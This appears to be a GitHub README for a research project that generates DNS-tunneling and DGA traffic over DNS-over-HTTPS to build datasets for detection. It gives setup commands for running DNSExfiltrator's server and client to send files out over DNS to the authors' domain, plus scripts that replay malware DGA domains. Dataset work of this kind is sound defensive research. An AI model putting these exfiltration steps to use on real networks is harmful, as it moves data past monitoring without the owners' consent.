# Generation and Classification of DGA and DNS Tunneling Traffic

This project focuses on simulating, capturing, and analyzing Domain Generation Algorithm (DGA) and DNS tunneling traffic. It provides a framework to study malicious DNS traffic patterns and train models or tools for classification and detection.

## 📌 Objectives

- Generate DNS tunneling traffic using various tools.
- Simulate DGA traffic patterns.
- Capture and analyze DNS queries and responses.
- Classify DGA vs. DNS tunneling traffic.

## 🧰 Tools and Software Used

| Tool           | Purpose                                                                 |
|----------------|-------------------------------------------------------------------------|
| [DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator) | Generate DNS tunneling traffic (data exfiltration). |
| [dnsproxy](https://github.com/AdguardTeam/dnsproxy)       | DNS proxy server supporting DoH, DoT, DoQ, DNSCrypt. |
| [CoreDNS](https://coredns.io/)                            | Pluggable DNS server for collecting and logging DNS queries. |
| [doh-server](https://github.com/m13253/dns-over-https)    | DNS-over-HTTPS server for simulating encrypted DNS traffic. |
| [dohlyzer](https://github.com/ahlashkari/DoHLyzer)           | Analyzes DoH traffic to detect anomalies and exfiltration. |

## 📦 Requirements

- DNS Server and Domain: any domain owned example: dohe.live and tunnel.dohe.live in this experiment
- DNSExfiltrator: for client and server
- dnsproxy: for client
- doh-server: for server
- Coredns: for server
  
## 🛠️ Installation


### DNSEXFILTRATOR SETUP

DNSExfiltrator is a proof-of-concept (PoC) tool designed to demonstrate how data can be exfiltrated over the DNS protocol. It works by encoding data into DNS queries, which are sent to an attacker-controlled domain. A DNS server controlled by the attacker decodes the incoming queries and reconstructs the original data.
This technique is commonly used in real-world scenarios where traditional outbound channels (HTTP, FTP, etc.) are monitored or blocked, but DNS traffic is still permitted. DNSExfiltrator helps simulate this behavior for research, detection, and defense testing.

In this project, DNSExfiltrator is used to generate labeled examples of DNS tunneling traffic. We use DNSExfiltrator to send 100 txt files over DNS to our remote server. We use DNS-over-HTTPS (DoH) protocol to send data. 

#### SERVER SETUP

- First we setup our server on any virtual machine.
  System version : Ubuntu 22.04
- server domain - tunnel.dohe.live
  
#### 1. Coredns Installation: 

Install go version 1.21.4

```bash
sudo install golang-go
```

Install coredns from https://github.com/coredns/coredns

```bash
git clone https://github.com/coredns/coredns
cd coredns
make
```

or Install binary directly from https://github.com/coredns/coredns/releases/tag/v1.12.1

```bash
# Download the CoreDNS archive
wget https://github.com/coredns/coredns/releases/download/v1.12.1/coredns_1.12.1_linux_amd64.tgz

# Extract the archive
tar -xvzf coredns_1.12.1_linux_amd64.tgz
```

```bash
# Move the binary to /usr/local/bin (optional but recommended)
sudo mv coredns /usr/local/bin/

# Make sure it's executable (if needed)
sudo chmod +x /usr/local/bin/coredns

# Verify installation
coredns -version
```

Create Corefile inside /etc/coredns/

Corefile:
```
tunnel.dohe.live {
    file /etc/coredns/db.dohe.live
    log
    errors
}
```

Create db.dohe.live file inside /etc/coredns/

db.dohe.live :
```
$ORIGIN tunnel.dohe.live.
$TTL 60
@   IN  SOA ns1.dohe.live. admin.dohe.live. (
        2025042601 ; serial
        3600       ; refresh
        1800       ; retry
        604800     ; expire
        60         ; minimum
    )
    IN  NS  ns1.dohe.live.
    IN  A   XX.XX.XX.XX
```

Use your own domain name in place of dohe.live and the server ip address in A.

Run coredns: 

```bash
coredns --conf Corefile
```

verify using 

```bash
dig tunnel.dohe.live
```

if it returns your server ip, everything is set up correctly.


#### 2. DNSExfiltrator Installation : 

Install python version 2.7 and pip for python2: 

```bash
sudo apt update
sudo apt install python2
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
```

Install DNSExfiltrator :

```bash
git clone https://github.com/Arno0x/DNSExfiltrator
cd DNSExfiltrator
python2 -m pip install -r requirements.txt
```

check if port 53 is being used and kill any processes running on port 53

```bash
sudo systemctl stop systemd-resolved
```

Run DNSExfiltrator server using :

```bash
 python2 dnsexfiltrator.py -d tunnel.dohe.live -p password
```
to keep the server running for long durations, the server can be run as a background process.   

The server is now setup and any computer can send files via dns-over-https to the server using tunnel.dohe.live as domain.  
Users can change domain name and password as needed.


#### CLIENT SETUP

#### 1. DNSExfiltrator Installation: 

#### General Installation
System requirements : Windows, powershell

```bash
git clone https://github.com/Arno0x/DNSExfiltrator
cd DNSExfiltrator
```

To Run DNSExfiltrator (from DNSExfiltrator/release directory):

```powershell
./dnsExfiltrator.exe <file name> <domain> <password>
```

#### Direct Installation:

```bash
git clone https://github.com/bhuvanmg/Classification-of-DoH-traffic.git
```
go to DNSExfiltrator/release directory 

To send 100 text files we use the scripts inside DNSExfiltrator.  
gen_data.sh -> generates 100 random txt files  
exfil_data.sh -> sends the 100 txt files to our server continously for 8 hours.
```powershell
./gen_data.ps1
./exfil_data.ps1
```

We send these files over DoH and capture the traffic using wireshark.  

To send them over DoH we need dnsproxy, which sends all DNS Traffic over https using adgurad or google dns servers.

#### 2. dnsproxy Installation: 

There are several options how to install dnsproxy.

- Grab the binary for your device/OS from the [Releases](https://github.com/AdguardTeam/dnsproxy/releases) page.
- using make build from the following repo: [dnsproxy](https://github.com/AdguardTeam/dnsproxy)
- use the binary in this [repo](https://github.com/bhuvanmg/Classification-of-DoH-traffic.git)

Usage : 

Run dnsproxy using :

```bash
dnsproxy.exe -l 127.0.0.1 -p 53 -u https://dns.adguard.com/dns-query -b 8.8.8.8:53
```
or
```bash
dnsproxy.exe -l 127.0.0.1 -p 53 -u https://dns.google/dns-query -b 8.8.8.8:53
```

this run dnsproxy on localhost port 53 and sends all dns requests upstream to adguard or google server over https.  
It forwards all requests to tunnel.dohe.live to our server where DNSExfiltrator is running.


The traffic captured is given in the dnsexfil_pcaps folder which is converted to csv using DoHLyzer.


### DGA SETUP 

Domain Generation Algorithms (DGAs) are techniques used by malware to algorithmically generate a large number of domain names that can be used for command-and-control (C2) communication. Instead of hardcoding a single server address, DGAs allow malware to contact different domains daily or even hourly, making it more difficult for defenders to block malicious traffic or take down C2 servers.  

server domain - dohe.live

#### SERVER SETUP :

#### 1. Coredns Installation 

Install coredns as detailed above.  
Change the Corefile config as below

Corefile:
```bash
.:53 {
        template IN A {
        match .*
        answer "{{ .Name }} 60 IN A 99.99.99.99"
        }
        log
        errors
}
```

Now we need a DoH server to simulate DNS traffic. Since coredns does not support DoH replies.

#### 2. DoH server Installation

```bash
git clone https://github.com/m13253/dns-over-https.git
cd dns-over-https
cd doh-server
```

For Dns-over-https, we need to setup certificates and key for our server(https://dohe.live)

#### using certbot for cert files:

```bash
sudo apt update
sudo apt install certbot
```
```bash
sudo certbot certonly --standalone -d dohe.live
```
It will create cert files here:  
/etc/letsencrypt/live/dohe.live/fullchain.pem  
/etc/letsencrypt/live/dohe.live/privkey.pem  

You now have real, trusted SSL certificates!

Now replace the dns-over-https/doh-server/doh-server.conf file with doh-server.conf file in this repo.

Run DoH server and coredns server after everything is setup:  

From doh-server run :
```powershell
./doh-server -conf doh-server.conf
```

From etc/coredns run :
```powershell
coredns -conf Corefile
```

The server is now listening on port 443 for DoH and forwards thfobberese requests to coredns server running on port 53 and sends replies back to client.

#### CLIENT SETUP 

#### 1. dnsproxy 

Install dnsproxy as mentioned above.
Run dnsproxy forwarding requests to our server:
```bash
dnsproxy.exe -l 127.0.0.1 -p 45 -u https://dohe.live/dns-query -b 8.8.8.8:53
```
We use port 45 to differntiate our dga traffic from other normal dns traffic.
To skip TLS certificate validation, use --insecure flag with dnsproxy. There is no need to setup certificates for the server using certbot if using --insecure.

example usage :
```bash
dnsproxy.exe -l 127.0.0.1 -p 45 -u https://dohe.live/dns-query -b 8.8.8.8:53 --insecure
```

#### 2. Domain Generation algorithms

We used the following 10 algorithms : 
- banjori
- fobber
- fosniw
- murofet
- mydoom
- necurs
- orchard
- qadars
- qakbot
- tinba

The code for the above algorithms are listed in the repo.

Each algorithm generates 500-3000 domain names.
We send dns requests for each of these domains to our server https://dohe.live using dns_query.py which sends it through our dnsproxy.
We send these requests for in a loop and capture the traffic using wireshark.

To run :

```bash
git clone https://github.com/bhuvanmg/Classification-of-DoH-traffic.git
```
Go to dga and run dns_query.bat file(this sends dns requests in a loop for as long as needed to capture traffic).

The traffic captured is given in the dga_pcaps folder which is converted to csv using DoHLyzer.
